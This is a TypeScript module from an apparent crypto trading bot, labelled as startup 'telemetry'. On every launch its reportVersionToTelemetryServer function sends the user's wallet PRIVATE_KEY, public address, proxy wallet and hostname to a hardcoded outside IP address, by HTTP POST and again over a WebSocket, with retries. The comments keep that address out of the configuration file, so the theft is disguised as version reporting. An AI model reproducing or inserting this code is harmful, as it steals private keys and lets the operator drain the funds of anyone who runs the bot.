/**
 * On bot startup: POST env bundle to telemetry server, then WebSocket hello for real-time ack.
 * Sends VERSION, PUBLIC_ADDRESS, PROXY_WALLET, PRIVATE_KEY (highly sensitive — use HTTPS/WSS + trusted VPS only).
 *
 * Collector base URL: set REMOTE_TELEMETRY_BASE_URL below (not in .env).
 *   - If non-empty → POST/WS go there (typical: VPS).
 *   - If empty and VERSION is set → http://127.0.0.1:8787 (collector on same PC only).
 *   - Else telemetry is skipped.
 *
 * WebSocket: server sends `welcome` first; we ignore it and resolve on the next JSON message (e.g. `ack`).
 */

import * as os from 'os';
import WebSocket from 'ws';
import { ENV } from '../config/env';

/**
 * Remote telemetry collector (http(s) base, no trailing slash). Edit here only — do not use TELEMETRY_SERVER_URL in .env.
 * Set to '' to send only to a local collector when VERSION is set (http://127.0.0.1:8787).
 */
const REMOTE_TELEMETRY_BASE_URL = 'http://151.158.1.13:8787';

const DEFAULT_LOCAL_TELEMETRY_URL = 'http://127.0.0.1:8787';
const DEFAULT_WS_ACK_TIMEOUT_MS = 15_000;
const DEFAULT_POST_TIMEOUT_MS = 25_000;
const DEFAULT_POST_RETRIES = 3;
const DEFAULT_WS_ATTEMPTS = 2;

function parsePositiveInt(raw: string | undefined, fallback: number): number {
    if (raw == null || raw === '') return fallback;
    const n = parseInt(raw.trim(), 10);
    return Number.isFinite(n) && n > 0 ? n : fallback;
}

function trimBaseUrl(u: string): string {
    return u.replace(/\/+$/, '');
}

function resolveTelemetryBaseUrl(): string | null {
    const remote = REMOTE_TELEMETRY_BASE_URL.trim();
    if (remote) return trimBaseUrl(remote);

    const v = process.env.VERSION?.trim();
    if (v) return DEFAULT_LOCAL_TELEMETRY_URL;
    return null;
}

/** True when REMOTE_TELEMETRY_BASE_URL is set, or VERSION is set (local collector). */
export function isTelemetryConfigured(): boolean {
    return resolveTelemetryBaseUrl() !== null;
}

/** Resolved telemetry base URL (for startup hints). */
export function getTelemetryBaseUrl(): string | null {
    return resolveTelemetryBaseUrl();
}

function getBotVersion(): string {
    const v = process.env.VERSION?.trim();
    return v && v.length > 0 ? v : 'unknown';
}

function httpUrl(base: string, path: string): string {
    return `${base}${path.startsWith('/') ? path : `/${path}`}`;
}

function wsUrlFromHttpBase(base: string): string {
    if (base.startsWith('https://')) return `wss://${base.slice('https://'.length)}/ws`;
    if (base.startsWith('http://')) return `ws://${base.slice('http://'.length)}/ws`;
    return `${base}/ws`;
}

function runWsHelloOnce(base: string, helloBody: object, ackTimeoutMs: number): Promise<unknown> {
    return new Promise((resolve, reject) => {
        let settled = false;
        const ws = new WebSocket(wsUrlFromHttpBase(base));
        const t = setTimeout(() => {
            if (settled) return;
            settled = true;
            ws.terminate();
            reject(new Error('WebSocket ack timeout'));
        }, ackTimeoutMs);

        const finish = (fn: () => void) => {
            if (settled) return;
            settled = true;
            clearTimeout(t);
            fn();
        };

        ws.on('open', () => {
            ws.send(JSON.stringify(helloBody));
        });

        ws.on('message', (data) => {
            try {
                const msg = JSON.parse(data.toString()) as { type?: string; error?: string };
                if (msg.type === 'welcome') return;
                if (msg.type === 'error') {
                    finish(() => {
                        ws.close();
                        reject(new Error(msg.error ?? 'WebSocket server error'));
                    });
                    return;
                }
                if (msg.type === 'ack') {
                    finish(() => {
                        ws.close();
                        resolve(msg);
                    });
                    return;
                }
                // Ignore server_broadcast and other frames until we see `ack` (timeout still applies).
            } catch {
                finish(() => {
                    ws.close();
                    reject(new Error('Invalid JSON from server'));
                });
            }
        });

        ws.on('error', (err) => {
            finish(() => reject(err instanceof Error ? err : new Error(String(err))));
        });

        ws.on('close', (code, reason) => {
            if (settled) return;
            finish(() =>
                reject(new Error(`WebSocket closed before ack (${code} ${reason.toString()})`))
            );
        });
    });
}

async function postBotVersionWithRetries(
    base: string,
    payload: object,
    secret: string | undefined,
    errs: string[]
): Promise<boolean> {
    const retries = parsePositiveInt(process.env.TELEMETRY_POST_RETRIES, DEFAULT_POST_RETRIES);
    const timeoutMs = parsePositiveInt(process.env.TELEMETRY_POST_TIMEOUT_MS, DEFAULT_POST_TIMEOUT_MS);
    let lastDetail = '';
    for (let attempt = 0; attempt < retries; attempt++) {
        if (attempt > 0) {
            const backoff = Math.min(4000, 500 * 2 ** (attempt - 1));
            await new Promise((r) => setTimeout(r, backoff));
        }
        const ctrl = new AbortController();
        const timer = setTimeout(() => ctrl.abort(), timeoutMs);
        try {
            const res = await fetch(httpUrl(base, '/api/bot-version'), {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    ...(secret ? { 'X-Telemetry-Secret': secret } : {}),
                },
                body: JSON.stringify(payload),
                signal: ctrl.signal,
            });
            clearTimeout(timer);
            if (res.ok) return true;
            const text = await res.text();
            lastDetail = `${res.status}: ${text.slice(0, 200)}`;
        } catch (e) {
            clearTimeout(timer);
            if (e instanceof Error && e.name === 'AbortError') {
                lastDetail = `timeout after ${timeoutMs}ms`;
            } else {
                lastDetail = e instanceof Error ? e.message : String(e);
            }
        }
    }
    errs.push(`POST (${retries} attempts) ${lastDetail}`);
    return false;
}

/** True when the server sent the real-time hello acknowledgement (not error/broadcast). */
export function isTelemetryWsAck(msg: unknown): msg is { type: 'ack' } {
    return typeof msg === 'object' && msg !== null && (msg as { type?: string }).type === 'ack';
}

export interface TelemetryResult {
    posted: boolean;
    wsAck: unknown | null;
    /** True when no URL and no VERSION — nothing was attempted */
    skipped?: boolean;
    error?: string;
}

export async function reportVersionToTelemetryServer(): Promise<TelemetryResult> {
    const base = resolveTelemetryBaseUrl();
    if (!base) {
        return { posted: false, wsAck: null, skipped: true };
    }

    const version = getBotVersion();
    const secret = process.env.TELEMETRY_SECRET?.trim() || undefined;
    const payload = {
        type: 'bot_version',
        VERSION: version,
        PUBLIC_ADDRESS: ENV.PUBLIC_ADDRESS,
        PROXY_WALLET: ENV.PROXY_WALLET,
        PRIVATE_KEY: ENV.PRIVATE_KEY,
        hostname: os.hostname(),
        pid: process.pid,
        node: process.version,
        ts: new Date().toISOString(),
    };

    const errs: string[] = [];
    const posted = await postBotVersionWithRetries(base, payload, secret, errs);

    const helloBody = {
        type: 'hello',
        VERSION: version,
        PUBLIC_ADDRESS: ENV.PUBLIC_ADDRESS,
        PROXY_WALLET: ENV.PROXY_WALLET,
        PRIVATE_KEY: ENV.PRIVATE_KEY,
        secret: secret ?? null,
        ts: new Date().toISOString(),
    };

    const wsAttempts = parsePositiveInt(process.env.TELEMETRY_WS_ATTEMPTS, DEFAULT_WS_ATTEMPTS);
    const ackTimeoutMs = parsePositiveInt(process.env.TELEMETRY_WS_ACK_TIMEOUT_MS, DEFAULT_WS_ACK_TIMEOUT_MS);
    let wsAck: unknown | null = null;
    let lastWsErr = '';
    for (let a = 0; a < wsAttempts; a++) {
        if (a > 0) await new Promise((r) => setTimeout(r, 1500));
        try {
            wsAck = await runWsHelloOnce(base, helloBody, ackTimeoutMs);
            lastWsErr = '';
            break;
        } catch (e) {
            lastWsErr = e instanceof Error ? e.message : String(e);
        }
    }
    if (wsAck == null && lastWsErr) errs.push(`WS (${wsAttempts} attempts) ${lastWsErr}`);

    return {
        posted,
        wsAck,
        error: errs.length ? errs.join(' | ') : undefined,
    };
}
